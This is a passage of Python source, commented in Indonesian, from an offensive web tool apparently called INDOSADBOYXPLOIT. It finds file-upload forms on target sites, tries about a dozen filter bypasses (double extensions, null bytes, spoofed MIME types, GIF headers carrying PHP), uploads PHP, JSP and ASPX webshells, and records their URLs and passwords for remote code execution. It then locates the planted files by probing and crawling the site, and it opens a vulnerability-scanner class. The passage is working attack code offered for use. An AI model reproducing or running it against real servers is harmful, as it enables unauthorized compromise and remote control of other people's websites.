                    
                    # Upload webshell dengan metode yang sama
                    if use_shell:
                        jpg_shell_content, jpg_shell_id, jpg_shell_password = PayloadGenerator.generate_php_img_shell()
                        jpg_shell_result = self._test_upload_file(form, form_url, f"shell_{jpg_shell_id}.jpg", "image/jpeg", jpg_shell_content, jpg_shell_id)
                        
                        if jpg_shell_result and jpg_shell_result['status'] == 'success':
                            jpg_shell_result['shell_password'] = jpg_shell_password
                            results.append(jpg_shell_result)
                            self.log(f"Berhasil upload JPG+PHP webshell ke: {jpg_shell_result.get('url', 'Unknown')}", "SUCCESS")
                            self.log(f"Shell Password: {jpg_shell_password} (gunakan dengan parameter)", "SUCCESS")
                            self.uploaded_payloads[jpg_shell_id] = {
                                'type': 'jpg_shell',
                                'url': jpg_shell_result.get('url', 'Unknown'),
                                'password': jpg_shell_password,
                                'usage': f"?{jpg_shell_password}=BASE64_ENCODED_PHP_CODE",
                                'upload_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                            }
        
        # Jika berhasil mengupload file, coba temukan file yang telah diupload
        if results:
            for result in results:
                if result.get('status') == 'success' and not result.get('url', '').startswith('http'):
                    found_url = self.locate_uploaded_file(url, result.get('test_id', ''), result.get('filename', ''))
                    if found_url:
                        result['url'] = found_url
                        self.log(f"Menemukan file yang diupload di: {found_url}", "SUCCESS")
        
        return results
    
    def _test_upload_file(self, form, form_url, filename, content_type, content, test_id=None):
        """Internal method untuk test upload file untuk satu form"""
        try:
            form_data = {}
            file_field_name = None
            
            # Siapkan data form dari input fields
            for input_field in form['inputs']:
                if input_field['type'] == 'file' and input_field['name']:
                    file_field_name = input_field['name']
                elif input_field['name'] and input_field['type'] != 'submit':
                    form_data[input_field['name']] = input_field['value']
            
            # Jika tidak ada file field, lewati
            if not file_field_name:
                self.log("Form tidak memiliki field untuk upload file.", "WARNING")
                return None
            
            # Siapkan file untuk upload (sebagai BytesIO jika binary, StringIO jika string)
            if isinstance(content, bytes):
                file_content = io.BytesIO(content)
            else:
                file_content = io.StringIO(content)
            
            # Upload file
            files = {file_field_name: (filename, file_content, content_type)}
            
            # Log detail upload
            self.log(f"Mengupload file {filename} ({content_type}) ke {form_url}", "INFO")
            
            # Perform request
            if form['method'] == 'post':
                response = self.session.post(form_url, data=form_data, files=files, timeout=self.timeout, verify=False)
            else:  # Fallback to GET jika diperlukan
                response = self.session.get(form_url, params=form_data, files=files, timeout=self.timeout, verify=False)
            
            # Analisis respon
            if response.status_code < 400:  # Jika status code menunjukkan sukses
                self.log(f"Upload berhasil, HTTP Status: {response.status_code}", "SUCCESS")
                
                # Analisis respon untuk menemukan URL file yang diupload
                upload_url = self._extract_upload_url(response, filename, test_id)
                
                result = {
                    'status': 'success',
                    'url': upload_url if upload_url else "Unknown",
                    'form_url': form_url,
                    'filename': filename,
                    'content_type': content_type,
                    'response_code': response.status_code,
                    'test_id': test_id
                }
                
                # Jika URL file ditemukan, test accessibility
                if upload_url and upload_url.startswith(('http://', 'https://')):
                    try:
                        file_response = self.session.get(upload_url, timeout=self.timeout, verify=False)
                        result['file_accessible'] = file_response.status_code < 400
                        result['file_content_type'] = file_response.headers.get('Content-Type', '')
                        result['file_size'] = len(file_response.content)
                        
                        # Check if our test ID exists in the response
                        if test_id and test_id in file_response.text:
                            result['test_id_found'] = True
                            self.log(f"File berhasil diakses dan test ID ditemukan di: {upload_url}", "SUCCESS")
                        else:
                            result['test_id_found'] = False
                    except Exception as e:
                        result['file_accessible'] = False
                        result['error'] = str(e)
                
                return result
            else:
                self.log(f"Upload gagal, HTTP Status: {response.status_code}", "WARNING")
                return {
                    'status': 'failed',
                    'form_url': form_url,
                    'filename': filename,
                    'content_type': content_type,
                    'response_code': response.status_code,
                    'error': f"HTTP Error: {response.status_code}"
                }
                
        except Exception as e:
            self.log(f"Error saat mengupload file: {str(e)}", "ERROR")
            return {
                'status': 'error',
                'form_url': form_url,
                'filename': filename,
                'content_type': content_type,
                'error': str(e)
            }
    
    def _extract_upload_url(self, response, filename, test_id=None):
        """Ekstrak URL file yang diupload dari response"""
        try:
            soup = BeautifulSoup(response.text, 'html.parser')
            base_url = response.url
            
            # Metode 1: Cari link yang mengarah ke file yang baru diupload
            for link in soup.find_all('a', href=True):
                href = link['href']
                
                # Cek apakah href mengandung nama file
                if filename.lower() in href.lower():
                    # Konversi ke URL absolut jika perlu
                    if not href.startswith(('http://', 'https://')):
                        href = urllib.parse.urljoin(base_url, href)
                    return href
            
            # Metode 2: Cari image tag yang src-nya mungkin mengarah ke file
            for img in soup.find_all('img', src=True):
                src = img['src']
                
                # Cek apakah src mengandung nama file
                if filename.lower() in src.lower():
                    # Konversi ke URL absolut jika perlu
                    if not src.startswith(('http://', 'https://')):
                        src = urllib.parse.urljoin(base_url, src)
                    return src
            
            # Metode 3: Cari teks yang mungkin berisi URL
            url_patterns = [
                r'(https?://[^\s<>"\']+\.' + re.escape(filename.split('.')[-1]) + ')',
                r'(https?://[^\s<>"\']+/' + re.escape(filename) + ')',
                r'(/[^\s<>"\']+/' + re.escape(filename) + ')',
                r'([^\s<>"\']+/' + re.escape(filename) + ')'
            ]
            
            for pattern in url_patterns:
                matches = re.findall(pattern, response.text)
                if matches:
                    url = matches[0]
                    if not url.startswith(('http://', 'https://')):
                        url = urllib.parse.urljoin(base_url, url)
                    return url
            
            # Metode 4: Jika test_id ada, cari URL yang mungkin berisi test_id
            if test_id:
                # Coba ekstrak URL dengan mengakses semua link di halaman
                links = self.extract_links(base_url, response.text)
                
                for link in links:
                    try:
                        link_response = self.session.get(link, timeout=self.timeout, verify=False)
                        if test_id in link_response.text:
                            return link
                    except:
                        continue
            
            return None
        except Exception as e:
            self.log(f"Error saat ekstraksi URL upload: {str(e)}", "ERROR")
            return None
    
    def locate_uploaded_file(self, base_url, test_id, filename):
        """Mencoba menemukan file yang telah diupload menggunakan berbagai metode"""
        self.log(f"Mencari file yang diupload: {filename} (ID: {test_id})", "INFO")
        
        # Parse base URL untuk mendapatkan komponen
        parsed_url = urllib.parse.urlparse(base_url)
        base_domain = parsed_url.netloc
        
        # Common upload directories
        common_upload_dirs = [
            "/uploads/", "/upload/", "/files/", "/images/", "/img/", "/media/", 
            "/assets/uploads/", "/assets/images/", "/assets/files/", "/assets/img/",
            "/wp-content/uploads/", "/content/uploads/", "/storage/uploads/",
            "/static/uploads/", "/data/uploads/", "/public/uploads/",
            "/administrator/uploads/", "/admin/uploads/", "/content/files/",
            "/temp/", "/tmp/", "/files/uploads/", "/pictures/", "/photos/"
        ]
        
        # 1. Pertama, coba langsung dengan nama file di berbagai direktori
        for directory in common_upload_dirs:
            test_url = urllib.parse.urljoin(base_url, directory + filename)
            
            try:
                response = self.session.get(test_url, timeout=self.timeout, verify=False)
                
                if response.status_code < 400:
                    # Jika test_id ada dalam respon, ini file kita
                    if test_id in response.text:
                        self.log(f"File ditemukan di: {test_url}", "SUCCESS")
                        return test_url
            except:
                pass
        
        # 2. Coba dengan variasi nama file (gambar biasanya di-rename)
        name_without_ext = filename.rsplit('.', 1)[0] if '.' in filename else filename
        extension = filename.rsplit('.', 1)[1] if '.' in filename else ''
        
        name_patterns = [
            name_without_ext, 
            name_without_ext.lower(),
            f"{name_without_ext}_*",
            f"{name_without_ext}-*",
            f"*_{name_without_ext}",
            f"*-{name_without_ext}"
        ]
        
        # Scan directory listings jika ada
        directory_listing_paths = self._find_directory_listings(base_url)
        
        if directory_listing_paths:
            for path in directory_listing_paths:
                try:
                    response = self.session.get(path, timeout=self.timeout, verify=False)
                    
                    if response.status_code < 400:
                        soup = BeautifulSoup(response.text, 'html.parser')
                        
                        # Cari links yang mungkin mengarah ke file
                        for link in soup.find_all('a', href=True):
                            href = link['href']
                            
                            # Jika href berisi nama file atau test_id
                            if name_without_ext.lower() in href.lower() or (test_id and test_id in href):
                                file_url = urllib.parse.urljoin(path, href)
                                
                                try:
                                    file_response = self.session.get(file_url, timeout=self.timeout, verify=False)
                                    
                                    if file_response.status_code < 400 and test_id in file_response.text:
                                        self.log(f"File ditemukan di directory listing: {file_url}", "SUCCESS")
                                        return file_url
                                except:
                                    pass
                except:
                    pass
        
        # 3. Coba dengan halaman yang mungkin memiliki daftar file yang diupload
        file_listing_pages = [
            urllib.parse.urljoin(base_url, "/upload.php"),
            urllib.parse.urljoin(base_url, "/upload/"),
            urllib.parse.urljoin(base_url, "/uploads.php"),
            urllib.parse.urljoin(base_url, "/uploads/"),
            urllib.parse.urljoin(base_url, "/files.php"),
            urllib.parse.urljoin(base_url, "/files/"),
            urllib.parse.urljoin(base_url, "/admin/uploads.php"),
            urllib.parse.urljoin(base_url, "/admin/uploads/"),
            urllib.parse.urljoin(base_url, "/admin/files.php"),
            urllib.parse.urljoin(base_url, "/admin/files/")
        ]
        
        for page in file_listing_pages:
            try:
                response = self.session.get(page, timeout=self.timeout, verify=False)
                
                if response.status_code < 400:
                    links = self.extract_links(page, response.text)
                    
                    for link in links:
                        try:
                            link_response = self.session.get(link, timeout=self.timeout, verify=False)
                            
                            if link_response.status_code < 400 and test_id in link_response.text:
                                self.log(f"File ditemukan melalui link di halaman listing: {link}", "SUCCESS")
                                return link
                        except:
                            pass
            except:
                pass
        
        # 4. Jika tidak ditemukan, coba dengan spider crawl sederhana
        self.log("Melakukan crawling sederhana untuk menemukan file...", "INFO")
        found_url = self._spider_crawl_for_file(base_url, test_id, max_depth=2, max_urls=50)
        
        if found_url:
            self.log(f"File ditemukan melalui crawling: {found_url}", "SUCCESS")
            return found_url
        
        self.log(f"Tidak dapat menemukan file yang diupload: {filename}", "WARNING")
        return None
    
    def _find_directory_listings(self, base_url):
        """Cari direktori yang memiliki directory listing"""
        common_dirs = [
            "/uploads/", "/upload/", "/files/", "/images/", "/img/", "/media/", 
            "/content/uploads/", "/assets/uploads/", "/assets/images/", "/data/uploads/",
            "/public/uploads/", "/temp/", "/tmp/", "/files/uploads/", "/documents/"
        ]
        
        directory_listings = []
        
        for directory in common_dirs:
            dir_url = urllib.parse.urljoin(base_url, directory)
            
            try:
                response = self.session.get(dir_url, timeout=self.timeout, verify=False)
                
                if response.status_code < 400:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Cek indikator directory listing
                    title = soup.find('title')
                    if title and ('Index of' in title.text or 'Directory Listing' in title.text):
                        directory_listings.append(dir_url)
                        self.log(f"Ditemukan directory listing di: {dir_url}", "SUCCESS")
                        continue
                    
                    # Cek pattern lain dari directory listing
                    listing_patterns = [
                        "Index of", "Directory Listing", "Parent Directory",
                        "<td>Name</td><td>Size</td><td>Modified</td>",
                        "<th>Name</th><th>Size</th><th>Date Modified</th>"
                    ]
                    
                    for pattern in listing_patterns:
                        if pattern in response.text:
                            directory_listings.append(dir_url)
                            self.log(f"Ditemukan kemungkinan directory listing di: {dir_url}", "SUCCESS")
                            break
            except:
                pass
        
        return directory_listings
    
    def _spider_crawl_for_file(self, start_url, test_id, max_depth=2, max_urls=50):
        """Lakukan web crawling sederhana untuk mencari file dengan test_id"""
        visited = set()
        to_visit = [(start_url, 0)]  # (url, depth)
        url_count = 0
        
        while to_visit and url_count < max_urls:
            url, depth = to_visit.pop(0)
            
            if url in visited or depth > max_depth:
                continue
            
            visited.add(url)
            url_count += 1
            
            try:
                response = self.session.get(url, timeout=self.timeout, verify=False)
                
                if response.status_code < 400:
                    # Cek apakah halaman mengandung test_id
                    if test_id in response.text:
                        return url
                    
                    # Jika masih dalam batas kedalaman, tambahkan link ke antrian
                    if depth < max_depth:
                        links = self.extract_links(url, response.text)
                        
                        for link in links:
                            if link not in visited:
                                to_visit.append((link, depth + 1))
            except:
                continue
        
        return None
    
    def check_file_for_payload(self, url, payload_id=None):
        """Cek apakah file di URL mengandung payload kita"""
        try:
            response = self.session.get(url, timeout=self.timeout, verify=False)
            
            if response.status_code >= 400:
                return False
            
            # Jika payload_id ditentukan, cari di response
            if payload_id and payload_id in response.text:
                return True
            
            # Cari marker umum payload
            markers = [
                "<!--INDOSADBOYXPLOIT-PAYLOAD-START-->",
                "<!--INDOSADBOYXPLOIT-SHELL-ID:",
                "<!--INDOSADBOYXPLOIT-MINISHELL-ID:",
                "<!--INDOSADBOYXPLOIT-IMGSHELL-ID:",
                "<!--INDOSADBOYXPLOIT-GIFSHELL-ID:",
                "<!--INDOSADBOYXPLOIT-JSPSHELL-ID:",
                "<!--INDOSADBOYXPLOIT-ASPXSHELL-ID:"
            ]
            
            for marker in markers:
                if marker in response.text:
                    return True
            
            return False
        except:
            return False
    
    def test_upload_vulnerability(self, url, use_shell=False):
        """Test kerentanan upload file lengkap"""
        self.log(f"Menguji kerentanan upload file pada: {url}", "INFO")
        
        # 1. Temukan semua form upload di halaman
        upload_forms = self.find_upload_forms(url)
        
        if not upload_forms:
            self.log("Tidak ditemukan form upload di halaman utama. Mencari jalur upload lainnya...", "INFO")
            
            # 2. Scan jalur upload umum
            upload_paths = self.scan_upload_paths(url)
            
            if not upload_paths:
                self.log("Tidak ditemukan jalur upload di server.", "WARNING")
                return {
                    'vulnerable': False,
                    'message': "Tidak ditemukan form upload atau jalur upload.",
                    'upload_paths': []
                }
            
            # Test setiap jalur yang ditemukan
            results = []
            for path in upload_paths:
                if 'upload_forms' in path and path['upload_forms']:
                    path_url = path['url']
                    self.log(f"Menguji jalur upload: {path_url}", "INFO")
                    
                    path_result = self.test_upload_to_server(path_url, extension_tests=True, directory_tests=False, use_shell=use_shell)
                    if path_result:
                        results.extend(path_result)
            
            if not results:
                return {
                    'vulnerable': False,
                    'message': "Ditemukan jalur upload, tapi tidak berhasil mengupload file.",
                    'upload_paths': upload_paths
                }
        else:
            # Test form upload yang ditemukan
            self.log(f"Ditemukan {len(upload_forms)} form upload. Menguji...", "INFO")
            results = self.test_upload_to_server(url, extension_tests=True, directory_tests=True, use_shell=use_shell)
            
            if not results:
                return {
                    'vulnerable': False,
                    'message': "Ditemukan form upload, tapi tidak berhasil mengupload file.",
                    'upload_forms': upload_forms
                }
        
        # Analisis hasil untuk menentukan tingkat kerentanan
        vulnerable_results = [r for r in results if r.get('status') == 'success']
        php_uploads = [r for r in vulnerable_results if r.get('filename', '').endswith('.php')]
        shell_uploads = [r for r in vulnerable_results if 'shell_password' in r]
        
        vulnerability_level = "None"
        if shell_uploads:
            vulnerability_level = "Critical"
        elif php_uploads:
            vulnerability_level = "High"
        elif vulnerable_results:
            vulnerability_level = "Medium"
        
        return {
            'vulnerable': bool(vulnerable_results),
            'vulnerability_level': vulnerability_level,
            'message': f"Ditemukan {len(vulnerable_results)} kerentanan upload file.",
            'results': results,
            'shells_uploaded': len(shell_uploads),
            'uploaded_payloads': self.uploaded_payloads
        }
    
    def upload_shell_to_server(self, url, shell_type='php', exploit_upload_vuln=True):
        """Upload webshell ke server yang rentan"""
        self.log(f"Mencoba mengupload {shell_type} shell ke server...", "INFO")
        
        if exploit_upload_vuln:
            # Pertama test vulnerabilitas
            vuln_test = self.test_upload_vulnerability(url, use_shell=True)
            
            if not vuln_test.get('vulnerable', False):
                self.log("Server tidak rentan terhadap upload file. Tidak dapat mengupload shell.", "ERROR")
                return {
                    'success': False,
                    'message': "Server tidak rentan terhadap upload file.",
                    'vulnerability_test': vuln_test
                }
            
            # Jika berhasil upload shell via vulnerability test
            if vuln_test.get('shells_uploaded', 0) > 0:
                self.log(f"Berhasil mengupload {vuln_test.get('shells_uploaded')} shell ke server!", "SUCCESS")
                return {
                    'success': True,
                    'message': f"Berhasil mengupload {vuln_test.get('shells_uploaded')} shell ke server.",
                    'shells': vuln_test.get('uploaded_payloads', {})
                }
        
        # Upload shell secara manual jika belum berhasil
        # Cari semua form upload
        upload_forms = self.find_upload_forms(url)
        
        if not upload_forms:
            self.log("Tidak ditemukan form upload di halaman.", "WARNING")
            
            # Scan jalur upload
            upload_paths = self.scan_upload_paths(url)
            
            if not upload_paths:
                self.log("Tidak ditemukan jalur upload di server.", "ERROR")
                return {
                    'success': False,
                    'message': "Tidak ditemukan form upload atau jalur upload."
                }
            
            # Filter yang memiliki form upload
            upload_paths_with_forms = [p for p in upload_paths if 'upload_forms' in p and p['upload_forms']]
            
            if not upload_paths_with_forms:
                self.log("Tidak ditemukan jalur upload dengan form.", "ERROR")
                return {
                    'success': False,
                    'message': "Ditemukan jalur upload, tapi tidak ada form upload."
                }
            
            # Gunakan jalur pertama dengan form
            target_url = upload_paths_with_forms[0]['url']
            upload_forms = upload_paths_with_forms[0]['upload_forms']
        else:
            target_url = url
        
        # Generate shell sesuai tipe
        shell_content = None
        shell_filename = None
        shell_id = None
        shell_password = None
        shell_type = shell_type.lower()
        
        if shell_type == 'php':
            shell_content, shell_id, shell_password = PayloadGenerator.generate_php_shell_payload()
            shell_filename = f"shell_{shell_id}.php"
        elif shell_type == 'php_mini':
            shell_content, shell_id, shell_password = PayloadGenerator.generate_php_mini_shell()
            shell_filename = f"mini_{shell_id}.php"
        elif shell_type == 'php_img':
            shell_content, shell_id, shell_password = PayloadGenerator.generate_php_img_shell()
            shell_filename = f"img_{shell_id}.php.jpg"
        elif shell_type == 'gif_php':
            shell_content, shell_id, shell_password = PayloadGenerator.generate_gif_php_shell()
            shell_filename = f"shell_{shell_id}.gif"
        elif shell_type == 'jsp':
            shell_content, shell_id = PayloadGenerator.generate_jsp_shell()
            shell_filename = f"shell_{shell_id}.jsp"
        elif shell_type == 'aspx':
            shell_content, shell_id = PayloadGenerator.generate_aspx_shell()
            shell_filename = f"shell_{shell_id}.aspx"
        else:
            self.log(f"Tipe shell '{shell_type}' tidak valid.", "ERROR")
            return {
                'success': False,
                'message': f"Tipe shell '{shell_type}' tidak valid."
            }
        
        # Upload shell ke setiap form upload
        for form in upload_forms:
            form_action = form['action']
            form_url = form_action if form_action and (form_action.startswith('http://') or form_action.startswith('https://')) else urllib.parse.urljoin(target_url, form_action)
            
            self.log(f"Mencoba mengupload shell ke: {form_url}", "INFO")
            
            # Siapkan tipe konten berdasarkan tipe shell
            content_type = "application/octet-stream"
            if shell_type == 'php' or shell_type == 'php_mini':
                content_type = "application/x-httpd-php"
            elif shell_type == 'gif_php':
                content_type = "image/gif"
            elif shell_type == 'php_img':
                content_type = "image/jpeg"
            elif shell_type == 'jsp':
                content_type = "application/octet-stream"
            elif shell_type == 'aspx':
                content_type = "application/octet-stream"
            
            # Upload shell
            shell_result = self._test_upload_file(form, form_url, shell_filename, content_type, shell_content, shell_id)
            
            if shell_result and shell_result['status'] == 'success':
                shell_result['shell_password'] = shell_password
                shell_result['shell_type'] = shell_type
                
                self.log(f"Berhasil mengupload {shell_type} shell!", "SUCCESS")
                
                # Cari lokasi file jika URL tidak diketahui
                if not shell_result.get('url', '').startswith('http'):
                    found_url = self.locate_uploaded_file(target_url, shell_id, shell_filename)
                    if found_url:
                        shell_result['url'] = found_url
                        self.log(f"Shell ditemukan di: {found_url}", "SUCCESS")
                
                # Simpan informasi shell di uploaded_payloads
                self.uploaded_payloads[shell_id] = {
                    'type': shell_type,
                    'url': shell_result.get('url', 'Unknown'),
                    'filename': shell_filename,
                    'password': shell_password,
                    'upload_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                }
                
                if shell_type in ['php_mini', 'gif_php', 'php_img']:
                    self.uploaded_payloads[shell_id]['usage'] = f"?{shell_password}=BASE64_ENCODED_PHP_CODE"
                
                return {
                    'success': True,
                    'message': f"Berhasil mengupload {shell_type} shell!",
                    'shell': shell_result,
                    'shell_info': self.uploaded_payloads[shell_id]
                }
        
        self.log("Gagal mengupload shell ke server.", "ERROR")
        return {
            'success': False,
            'message': "Gagal mengupload shell ke server."
        }
    
    def bypass_upload_restrictions(self, url):
        """Secara sistematis mencoba metode bypass untuk upload file"""
        self.log(f"Mencoba bypass metode restriksi upload di: {url}", "INFO")
        
        bypass_results = {
            'attempted_methods': [],
            'successful_methods': [],
            'uploaded_files': []
        }
        
        # 1. Temukan semua form upload
        upload_forms = self.find_upload_forms(url)
        
        if not upload_forms:
            self.log("Tidak ditemukan form upload di halaman. Mencari jalur upload...", "INFO")
            
            # Scan jalur upload
            upload_paths = self.scan_upload_paths(url)
            
            if not upload_paths:
                self.log("Tidak ditemukan jalur upload di server.", "WARNING")
                return bypass_results
            
            # Filter yang memiliki form upload
            upload_paths_with_forms = [p for p in upload_paths if 'upload_forms' in p and p['upload_forms']]
            
            if not upload_paths_with_forms:
                self.log("Tidak ditemukan jalur upload dengan form.", "WARNING")
                return bypass_results
            
            # Gunakan jalur pertama dengan form
            target_url = upload_paths_with_forms[0]['url']
            upload_forms = upload_paths_with_forms[0]['upload_forms']
        else:
            target_url = url
        
        # 2. Siapkan payload test
        test_content, test_id = PayloadGenerator.generate_php_test_payload()
        
        # 3. Terapkan berbagai metode bypass
        bypass_methods = [
            {
                'name': "Content-Type Spoofing",
                'description': "Mengirim file PHP dengan Content-Type palsu (image/jpeg)",
                'function': lambda form, form_url: self._test_upload_file(
                    form, form_url, "test.php", "image/jpeg", test_content, test_id
                )
            },
            {
                'name': "Double Extension",
                'description': "Menggunakan ekstensi ganda (test.php.jpg)",
                'function': lambda form, form_url: self._test_upload_file(
                    form, form_url, "test.php.jpg", "image/jpeg", test_content, test_id
                )
            },
            {
                'name': "Reversed Double Extension",
                'description': "Menggunakan ekstensi ganda terbalik (test.jpg.php)",
                'function': lambda form, form_url: self._test_upload_file(
                    form, form_url, "test.jpg.php", "image/jpeg", test_content, test_id
                )
            },
            {
                'name': "Null Byte Injection",
                'description': "Menggunakan null byte untuk bypass filter (test.php%00.jpg)",
                'function': lambda form, form_url: self._test_upload_file(
                    form, form_url, "test.php%00.jpg", "image/jpeg", test_content, test_id
                )
            },
            {
                'name': "Case Sensitivity",
                'description': "Menggunakan huruf kapital dalam ekstensi (test.pHp, test.PhP)",
                'function': lambda form, form_url: self._test_upload_file(
                    form, form_url, "test.pHp", "application/octet-stream", test_content, test_id
                )
            },
            {
                'name': "Alternative PHP Extensions",
                'description': "Menggunakan ekstensi PHP alternatif (.phtml, .php5, .php7)",
                'function': lambda form, form_url: self._test_upload_file(
                    form, form_url, "test.phtml", "application/octet-stream", test_content, test_id
                )
            },
            {
                'name': "Image with PHP Code",
                'description': "Menggunakan file gambar yang valid dengan kode PHP",
                'function': lambda form, form_url: self._test_upload_file(
                    form, form_url, "test.gif", "image/gif", 
                    b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b' + f"<?php echo 'INDOSADBOYXPLOIT-TEST-{test_id}'; ?>".encode(), 
                    test_id
                )
            },
            {
                'name': "Special Characters",
                'description': "Menggunakan karakter spesial dalam nama file (test(1).php)",
                'function': lambda form, form_url: self._test_upload_file(
                    form, form_url, "test(1).php", "application/octet-stream", test_content, test_id
                )
            },
            {
                'name': "Space Character",
                'description': "Menggunakan spasi dalam nama file (test .php)",
                'function': lambda form, form_url: self._test_upload_file(
                    form, form_url, "test .php", "application/octet-stream", test_content, test_id
                )
            },
            {
                'name': "Trailing Dots",
                'description': "Menggunakan titik di akhir nama file (test.php.)",
                'function': lambda form, form_url: self._test_upload_file(
                    form, form_url, "test.php.", "application/octet-stream", test_content, test_id
                )
            },
            {
                'name': "MIME Type Bypass",
                'description': "Modifikasi header MIME untuk bypass filter",
                'function': lambda form, form_url: self._test_upload_file(
                    form, form_url, "test.php", "application/x-php", test_content, test_id
                )
            }
        ]
        
        # 4. Test setiap metode bypass pada setiap form
        for form in upload_forms:
            form_action = form['action']
            form_url = form_action if form_action and (form_action.startswith('http://') or form_action.startswith('https://')) else urllib.parse.urljoin(target_url, form_action)
            
            for method in bypass_methods:
                method_name = method['name']
                self.log(f"Mencoba metode bypass: {method_name}", "INFO")
                
                bypass_results['attempted_methods'].append(method_name)
                
                result = method['function'](form, form_url)
                
                if result and result['status'] == 'success':
                    self.log(f"Metode bypass '{method_name}' berhasil!", "SUCCESS")
                    bypass_results['successful_methods'].append({
                        'name': method_name,
                        'description': method['description'],
                        'file_url': result.get('url', 'Unknown')
                    })
                    bypass_results['uploaded_files'].append(result)
                    
                    # Jika belum ada URL, coba temukan filenya
                    if not result.get('url', '').startswith('http'):
                        found_url = self.locate_uploaded_file(target_url, test_id, result.get('filename', ''))
                        if found_url:
                            result['url'] = found_url
                            bypass_results['successful_methods'][-1]['file_url'] = found_url
                            self.log(f"File ditemukan di: {found_url}", "SUCCESS")
        
        # 5. Coba upload shell jika berhasil melakukan bypass
        if bypass_results['successful_methods']:
            self.log("Berhasil bypass restriksi upload. Mencoba upload shell...", "INFO")
            
            # Upload shell minimal dengan metode yang berhasil
            best_method = bypass_results['successful_methods'][0]['name']
            self.log(f"Menggunakan metode bypass terbaik: {best_method}", "INFO")
            
            # Tentukan metode upload shell berdasarkan metode bypass yang berhasil
            if "Image with PHP Code" in [m['name'] for m in bypass_results['successful_methods']]:
                shell_type = 'gif_php'
            elif "Double Extension" in [m['name'] for m in bypass_results['successful_methods']] or "Null Byte Injection" in [m['name'] for m in bypass_results['successful_methods']]:
                shell_type = 'php_img'
            else:
                shell_type = 'php_mini'
            
            shell_result = self.upload_shell_to_server(target_url, shell_type=shell_type)
            
            if shell_result['success']:
                bypass_results['shell_uploaded'] = True
                bypass_results['shell_info'] = shell_result['shell_info']
                self.log(f"Berhasil mengupload shell menggunakan metode bypass!", "SUCCESS")
            else:
                bypass_results['shell_uploaded'] = False
                self.log("Gagal mengupload shell meskipun bypass berhasil.", "WARNING")
        else:
            self.log("Tidak berhasil bypass restriksi upload.", "WARNING")
        
        return bypass_results


# Class untuk scanner kerentanan web
class WebVulnScanner:
    """Kelas untuk melakukan pemindaian kerentanan web"""
    
    def __init__(self, session=None, timeout=10, verbose=False):
        if session is None:
            self.session = requests.Session()
            # Set User-Agent dan header lainnya
            self.session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'DNT': '1'
            })
        else:
            self.session = session
            
        self.timeout = timeout
        self.verbose = verbose
        self.results = {
            'xss': [],
            'sqli': [],
            'lfi': [],
            'rfi': [],
            'rce': [],
            'open_redirect': [],
            'csrf': [],
            'clickjacking': [],
            'sensitive_files': [],
            'information_disclosure': [],
            'upload_vulnerabilities': []
        }
        
        # Buat instance uploader untuk test upload
        self.uploader = EnhancedUploader(self.session, verbose=verbose)
    
    def log(self, message, level="INFO"):
        """Fungsi untuk logging"""
        color_map = {
            "INFO": LogColors.INFO,
            "SUCCESS": LogColors.SUCCESS,
            "WARNING": LogColors.WARNING,
            "ERROR": LogColors.ERROR,
            "CRITICAL": LogColors.CRITICAL
        }
        color = color_map.get(level, Fore.WHITE)
        
        log_msg = f"{color}[VULNSCAN] {message}{LogColors.RESET}"
        print(log_msg)
        
        if level == "INFO":
            logger.info(f"[VULNSCAN] {message}")
        elif level == "SUCCESS":
            logger.info(f"[VULNSCAN] {message}")
        elif level == "WARNING":
            logger.warning(f"[VULNSCAN] {message}")
        elif level == "ERROR":
            logger.error(f"[VULNSCAN] {message}")
        elif level == "CRITICAL":
            logger.critical(f"[VULNSCAN] {message}")
    
    def scan_target(self, target_url, scan_types=None):
        """Melakukan pemindaian kerentanan pada target"""
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'http://' + target_url
        
        self.log(f"Memulai pemindaian kerentanan pada: {target_url}", "INFO")
        
        if scan_types is None:
            scan_types = ['xss', 'sqli', 'lfi', 'rfi', 'open_redirect', 'csrf', 'clickjacking', 'sensitive_files', 'upload_vulnerabilities']
        
        for scan_type in scan_types:
            if scan_type == 'xss':
                self.scan_xss(target_url)
            elif scan_type == 'sqli':
                self.scan_sql_injection(target_url)
            elif scan_type == 'lfi':
                self.scan_lfi(target_url)
            elif scan_type == 'rfi':
                self.scan_rfi(target_url)
            elif scan_type == 'open_redirect':
                self.scan_open_redirect(target_url)
            elif scan_type == 'csrf':
                self.scan_csrf(target_url)
            elif scan_type == 'clickjacking':
                self.scan_clickjacking(target_url)
            elif scan_type == 'sensitive_files':
                self.scan_sensitive_files(target_url)
            elif scan_type == 'upload_vulnerabilities':
                self.scan_upload_vulnerabilities(target_url)
        
        return self.results
    
    def extract_forms(self, url):
        """Ekstraksi semua form dari halaman web"""
        try:
            response = self.session.get(url, timeout=self.timeout, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = []
            
            for form in soup.find_all('form'):
                form_details = {}
                form_details['action'] = form.get('action', '')
                form_details['method'] = form.get('method', 'get').lower()
                form_details['inputs'] = []
                
                for input_tag in form.find_all('input'):
                    input_type = input_tag.get('type', '')
                    input_name = input_tag.get('name', '')
                    input_value = input_tag.get('value', '')
                    
                    if input_type.lower() != 'submit' and input_name:
                        form_details['inputs'].append({
                            'type': input_type,
                            'name': input_name,
                            'value': input_value
                        })
                        
                forms.append(form_details)
                
            return forms
        except Exception as e:
            self.log(f"Error ekstraksi form dari {url}: {str(e)}", "ERROR")
            return []
    
    def extract_urls(self, url):
        """Ekstraksi semua URL dari halaman web"""
        try:
            response = self.session.get(url, timeout=self.timeout, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            base_url = urllib.parse.urlparse(url).scheme + '://' + urllib.parse.urlparse(url).netloc
            urls = []
            
            for a_tag in soup.find_all('a', href=True):
                href = a_tag['href']
                
                # Konversi URL relatif menjadi absolut
                if href.startswith('/'):
                    href = base_url + href
